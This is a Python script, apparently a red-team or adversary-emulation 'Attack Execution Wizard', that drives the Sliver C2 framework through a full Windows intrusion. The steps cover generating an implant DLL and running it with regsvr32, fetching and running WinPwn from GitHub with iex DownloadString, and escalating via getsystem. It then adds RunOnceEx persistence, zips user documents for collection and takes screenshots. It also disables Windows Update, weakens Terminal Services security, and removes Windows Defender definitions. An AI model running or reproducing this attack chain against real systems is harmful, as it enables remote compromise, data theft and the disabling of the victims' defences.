
import asyncio
from rich.console import Console
from rich.prompt import Confirm
from rich.panel import Panel
from typing import Dict
console = Console()
user_params: Dict[str, str] = {}
def print_welcome_message():
    console.print(
        Panel(
            "[bold blink yellow]🎯 Welcome to Attack Execution Wizard[/]",
            title="[bold green]Hello[/]",
            subtitle="[bold blue]Let's Begin[/]",
            expand=False,
        )
    )
def print_finished_message(message="Command completed!😊", status="info"):
    console.print(f"[bold green][FINISHED][/bold green] {message}")
def confirm_action(prompt: str = "Keep going with the next attack step?") -> bool:
    styled_prompt = f"[bold bright_cyan]{prompt}[/]"
    return Confirm.ask(
        styled_prompt,
        default="y",
        choices=["y", "n"],
        show_default=False,
    )      
async def main():
    print_welcome_message()
    from attack_executor.config import load_config
    config = load_config(config_file_path="/home/kali/Desktop/xiangmu/attack_executor-main/aurora/executor/config.ini")
    from attack_executor.post_exploit.Sliver import SliverExecutor
    sliver_executor = SliverExecutor(config=config)
    console.print("""\
        [bold green][MANUAL ACTION REQUIRED][/bold green]
        sliver > generate --mtls #{LHOST}:#{LPORT} --os windows --arch 64bit --format shared --save #{SAVE_PATH}
        sliver > mtls --lport #{LPORT}
        """)
    confirm_action()
    console.print("""\
        [bold green][MANUAL ACTION REQUIRED][/bold green]
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On attacker's machine)
        python -m http.server

        (On victim's machine)
        1. Open #{LHOST}:#{LPORT} in the browser
        2. Navigate to the path of the file on the attacker's machine
        3. Download the file to #{PATH}
        """)
    confirm_action()
    console.print("""\
        [bold green][MANUAL ACTION REQUIRED][/bold green]
        (This step needs human interaction and (temporarily) cannot be executed automatically)
        (On victim's machine, use PowerShell or Command Prompt)
        regsvr32 #{DLL_PATH}
        """)
    confirm_action()


    # Sliver-session selection
    console.print("[bold cyan]\n[Sliver Executor] Session Selection[/]")
    sliver_sessionid = await sliver_executor.select_sessions()

    user_params["SessionID"] = sliver_sessionid

    # Sliver command execution
    console.print(f"[bold cyan]\n[Sliver Executor] Executing: ls[/]")
    confirm_action()
    try:
        await sliver_executor.ls(user_params["SessionID"])
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    console.print(f"[bold cyan]\n📌[Sliver Executor] Step 6 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: tcp[/]")
    console.print(f"  Description: Show TCP connections (true/false)")
    default_val = "True"
    user_input = console.input(
        f"[bold]➤ Enter value for tcp [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: tcp")
    user_params["tcp"] = user_input

    console.print(f"[bold cyan]\n📌[Sliver Executor] Step 6 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: udp[/]")
    console.print(f"  Description: Show UDP connections (true/false)")
    default_val = "True"
    user_input = console.input(
        f"[bold]➤ Enter value for udp [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: udp")
    user_params["udp"] = user_input

    console.print(f"[bold cyan]\n📌[Sliver Executor] Step 6 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: ipv4[/]")
    console.print(f"  Description: Show IPv4 connections (true/false)")
    default_val = "True"
    user_input = console.input(
        f"[bold]➤ Enter value for ipv4 [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: ipv4")
    user_params["ipv4"] = user_input

    console.print(f"[bold cyan]\n📌[Sliver Executor] Step 6 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: ipv6[/]")
    console.print(f"  Description: Show IPv6 connections (true/false)")
    default_val = "True"
    user_input = console.input(
        f"[bold]➤ Enter value for ipv6 [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: ipv6")
    user_params["ipv6"] = user_input

    console.print(f"[bold cyan]\n📌[Sliver Executor] Step 6 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: listening[/]")
    console.print(f"  Description: Show listening ports (true/false)")
    default_val = "True"
    user_input = console.input(
        f"[bold]➤ Enter value for listening [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: listening")
    user_params["listening"] = user_input

    user_params["SessionID"] = sliver_sessionid

    # Sliver command execution
    console.print(f"[bold cyan]\n[Sliver Executor] Executing: netstat[/]")
    confirm_action()
    try:
        await sliver_executor.netstat(user_params["tcp"], user_params["udp"], user_params["ipv4"], user_params["ipv6"], user_params["listening"], user_params["SessionID"])
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    user_params["SessionID"] = sliver_sessionid

    confirm_action()
    commands = rf"""
    $S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); otherchecks -noninteractive -consoleoutput
    """
    await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

    console.print("[bold green][MANUAL ACTION REQUIRED][/bold green]")
    console.print("In the Sliver C2 console, execute the [bold green]getsystem[/bold green] command on a session with local administrator privileges to obtain a session under the NT AUTHORITY\SYSTEM account. Once elevated system privileges are acquired, you can select this high-privilege session to perform subsequent operations.")
    confirm_action()
    sliver_sessionid = await sliver_executor.select_sessions()

    confirm_action()
    commands = """
    REG ADD HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d \"#{thing_to_execute}\"

    """
    await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()


    confirm_action()

    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 13 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: output_zip_folder_path[/]")
    console.print(f"  Description: Path to directory for saving the generated zip file")
    default_val = "PathToAtomicsFolder\..\ExternalPayloads\T1005"
    user_input = console.input(
        f"[bold]➤ Enter value for output_zip_folder_path [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: output_zip_folder_path")
    user_params["output_zip_folder_path"] = user_input
    commands = """
    $startingDirectory="C:"; $outputZip="#{output_zip_folder_path}"; $fileExtensions=@(".doc",".docx",".txt"); New-Item -Type Directory $outputZip -Force -ErrorAction Ignore | Out-Null; Get-ChildItem -Path $startingDirectory -Recurse -File | Where-Object {$_.Extension -in $fileExtensions} | ForEach-Object -Begin {$files=@()} -Process {$files += $_.FullName} -End {if ($files) { Compress-Archive -Path $files -DestinationPath "$outputZip\data.zip"; Write-Host "Zip file created: $outputZip\data.zip" } else { Write-Host "No files found" }}

    """
    await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

    console.print(f"[bold cyan]\n📌[Sliver Executor] Step 14 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: remote_path[/]")
    console.print(f"  Description: Full path of the directory to create")
    default_val = ""
    user_input = console.input(
        f"[bold]➤ Enter value for remote_path [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: remote_path")
    user_params["remote_path"] = user_input

    user_params["SessionID"] = sliver_sessionid

    # Sliver command execution
    console.print(f"[bold cyan]\n[Sliver Executor] Executing: mkdir[/]")
    confirm_action()
    try:
        await sliver_executor.mkdir(user_params["remote_path"], user_params["SessionID"])
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    confirm_action()

    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 15 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: input_file[/]")
    console.print(f"  Description: Path that should be compressed into our output file")
    default_val = "$env:USERPROFILE"
    user_input = console.input(
        f"[bold]➤ Enter value for input_file [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: input_file")
    user_params["input_file"] = user_input

    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 15 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: output_file[/]")
    console.print(f"  Description: Path where resulting compressed data should be placed")
    default_val = "$env:USERPROFILE\T1560-data-ps.zip"
    user_input = console.input(
        f"[bold]➤ Enter value for output_file [default: {default_val}]: [/]"
    ) or default_val
    if not user_input and False:
        raise ValueError("Missing required parameter: output_file")
    user_params["output_file"] = user_input
    commands = rf"""
    dir {user_params["input_file"]} -Recurse | Compress-Archive -DestinationPath {user_params["output_file"]}

    """
    await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

    user_params["SessionID"] = sliver_sessionid

    # Sliver command execution
    console.print(f"[bold cyan]\n[Sliver Executor] Executing: screenshot[/]")
    confirm_action()
    try:
        await sliver_executor.screenshot(user_params["SessionID"])
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise

    confirm_action()
    commands = """
    reg add \"HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU\" /v \"NoAutoUpdate\" /t REG_DWORD /d 1 /f

    """
    await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

    confirm_action()
    commands = """
    reg add \"HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\" /v shutdownwithoutlogon /t REG_DWORD /d 0 /f

    """
    await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

    confirm_action()
    commands = """
    bcdedit /set safeboot network
    """
    await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

    user_params["SessionID"] = sliver_sessionid


    confirm_action()
    commands = f"""
    reg add "HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\Terminal Services" /v "DisableSecuritySettings" /t REG_DWORD /d 1 /f
    """
    await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

    confirm_action()
    commands = """
    reg add \"HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\" /v HideSCANetwork /t REG_DWORD /d 1 /f

    """
    await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

    confirm_action()
    commands = """
    \"C:\Program Files\Windows Defender\MpCmdRun.exe\" -RemoveDefinitions -All

    """
    await sliver_executor.cmd(session_id=sliver_sessionid,input_commands=commands)

    print_finished_message()

if __name__ == "__main__":
    asyncio.run(main())
